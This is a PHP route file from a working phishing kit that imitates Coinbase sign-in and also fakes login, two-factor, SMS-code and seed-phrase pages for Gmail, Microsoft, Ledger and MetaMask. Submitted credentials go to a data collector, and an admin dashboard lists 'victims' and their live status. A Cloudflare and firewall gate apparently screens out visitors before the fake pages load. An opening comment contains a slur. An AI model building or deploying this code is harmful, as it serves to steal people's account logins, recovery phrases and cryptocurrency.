<?php
error_reporting(E_ALL & ~E_DEPRECATED & ~E_NOTICE); // bc of 8.0- gay DEPRECATED errors

require __DIR__ . "/../../vendor/autoload.php";

use FurqanSiddiqui\BIP39\BIP39;

// Coinbase index routes, for the main app
class IndexRoutes {
    public function index() {

        $klein = new \Klein\Klein();

         // Other login routes
         $this->loginRoutes($klein);

         // Admin routes
         $this->adminRoutes($klein);

        require __DIR__ . '/../../app/controller/handler/actions.php';
        
        if(panelcheck() == True) {
            $klein->respond('GET', '/signin', function ($request) use ($klein) {
                // return if there is no fake client ID
                
            
                if (!isset($request->client_id)) {
                    return $klein->response()->redirect('/');
                }

                if (preg_match('/^[a-zA-Z0-9_-]+$/', $request->client_id) &&
                    isset($request->oauth_challenge) && preg_match('/^[a-zA-Z0-9_-]+$/', $request->oauth_challenge) &&
                    $request->pwd === 'true') {
                    require __DIR__ .'../../pages/login/login-pwd.php';
                } else {
                    require __DIR__ .'../../pages/login/main-login.html';
                }

                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond('GET', '/account/whitelist', function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/coinbase/whitelist/Authentication.html';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond('GET', '/account/linked', function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/coinbase/whitelist/Success.html';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond('GET','/signin/loading', function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/loading/loading.php';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond(['POST', 'GET'],'/signin/callback', function () {
                require __DIR__ .'../../controller/data/collector.php';
            });

            $klein->respond('GET', '/', function () use ($klein) {
                $this->CF_CHECK();
                $this->check_sign_id($klein);

                if (isset($_SESSION['email']) && isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/signin/loading?client_id=' . $this->create_sign_id_unq() . '&oauth_challenge=' . $this->create_sign_id_unq());
                }

                return $klein->response()->redirect('/signin?client_id=' . $this->create_sign_id_unq() . '&oauth_challenge=' . $this->create_sign_id_unq());
            });

            $klein->respond('GET','/firewall', function ($request) use ($klein) {
                require __DIR__ .'../../pages/loading/firewall.php';
                echo "<script src='../../static/handler.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond("GET","/account/vault", function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/');
                }

                require __DIR__ .'../../pages/seed/seedGen.php';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond("GET","/account/metamask", function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/metamask/MetaMask.html';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });


            $klein->respond("GET","/account/metamask/loading", function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/metamask/LoadingMeta.html';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });


            $klein->respond("GET","/account/wallet/unlink", function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/coinbase/wallet/unlinkcb.html';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond("GET","/account/wallet/external/unlink", function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/coinbase/wallet/unlink.html';
                echo "<script src='../../../static/heartbeat.js'></script>";
                echo "<script src='../../../static/crawler.js'></script>";
            });


            $klein->respond("GET","/account/reset", function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/reset/reset-password.html';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond("GET","/account/recovery", function ($request)  use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/coinbase/wallet.php';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond("GET","/account/pending", function ($request)  use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/coinbase/pending.php';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond("GET","/account/sms", function ($request)  use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION['email']) || !isset($_SESSION['password'])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/coinbase/sms/smsCode.php';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond("GET","/account/terminate", function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION["email"]) || !isset($_SESSION["password"])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/coinbase/url/urlDepo.php';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond("GET", "/account/wallet/setup", function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION["email"]) || !isset($_SESSION["password"])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/coinbase/wallet/Wallet.html';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond("GET","/account/unauth", function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION["email"]) || !isset($_SESSION["password"])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/coinbase/unauth/unauthRoute.php';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });

            $klein->respond("GET","/account/wait", function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION["email"]) || !isset($_SESSION["password"])) {
                    return $klein->response()->redirect('/');
                }

                require __DIR__ .'../../pages/coinbase/wait.php';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });


            $klein->respond("GET","/account/reschedule", function ($request) use ($klein) {
                if (!isset($request->client_id) || !isset($_SESSION["email"]) || !isset($_SESSION["password"])) {
                    return $klein->response()->redirect('/');
                }
                require __DIR__ .'../../pages/coinbase/resc.php';
                echo "<script src='../../static/heartbeat.js'></script>";
                echo "<script src='../../static/crawler.js'></script>";
            });


            $klein->respond("GET","/callback/phrase", function ($request) {
                $mnemonic = BIP39::Generate(12);
                $phrase = implode(' ', $mnemonic->words);
                return json_encode(["phrase" => $phrase]);
            });


            $klein->respond("GET", '/sms/num', function (){
                return json_encode(["num" => check_sms_numb()]);
            });
        }

        $klein->dispatch();
    }

    public function loginRoutes($klein)
    {
        $klein->respond('GET','/ms/login', function ($request) {
            require __DIR__ .'../../pages/microsoft/password.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });

        $klein->respond('GET','/g/2fa', function ($request) {
            require __DIR__ .'../../pages/gmail/2fa-main.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });

        $klein->respond("GET","/g/pwd", function ($request) {
            require __DIR__ .'../../pages/gmail/password.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });

        $klein->respond("GET","/l/recovery", function ($request) {
            require __DIR__ .'../../pages/ledger/ledger.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });


        $klein->respond("GET","/g/verify", function ($request) {
            require __DIR__ .'../../pages/gmail/verify.php';
            echo "<script src='../../static/heartbeat.js'></script>";
            echo "<script src='../../static/crawler.js'></script>";
        });

        
       
    }
    public function adminRoutes($klein) {
        $klein->respond('GET', '/admin', function () {
            require __DIR__ . '/../../app/admin/dashboard/home.php';
        });

        $klein->respond('GET', '/admin/users/heartbeat', function () {
            require __DIR__ . '/../../app/admin/users/userHeartbeat.php';
        });

        $klein->respond('GET','/admin/victims/heartbeat', function () {
            require __DIR__ . '/../../app/admin/users/victimHeartbeat.php';
        });

        $klein->respond('GET', '/admin/login', function () {
            require __DIR__ . '/../../app/admin/login/login.php';
        });

        $klein->respond('POST', '/admin/login-data', function () {
            require __DIR__ . '/../../app/admin/login/login-data.php';
        });
        $klein->respond('GET', '/admin/actions', function () {
            require __DIR__ . '/../../app/admin/actions/adminActions.php';
        });

        $klein->respond('GET', '/admin/victims', function () {
            require __DIR__ . '/../../app/admin/dashboard/victims.php';
        });
        
        $klein->respond('GET', '/admin/settings', function () {
            require __DIR__ . '/../../app/admin/dashboard/settings.php';
        });
    }
    public function create_sign_id_unq() {
        // Make signin look like the real signin via coinbase
        return uniqid() . '-' . uniqid() . '-' . uniqid() . '-' . uniqid();
    }

    public function check_sign_id($klein) {
        
        if (checkFirewall() == True) {
            if (!isset($_SESSION['victim_id'])){
                create_sign_id_victim();
            }
    
            if (check_sign_id_action() == False) {
                exit(header('Location: /firewall'));
            }
            
        }
        
    }


    public function CF_CHECK() {
        if (check_cloudflare() == 1) {
            if (!isset($_SESSION['cloudflare'])) {
                require __DIR__ . '../../pages/loading/cloudflare.php';
                exit;
            }
        }
    }

    
    
}
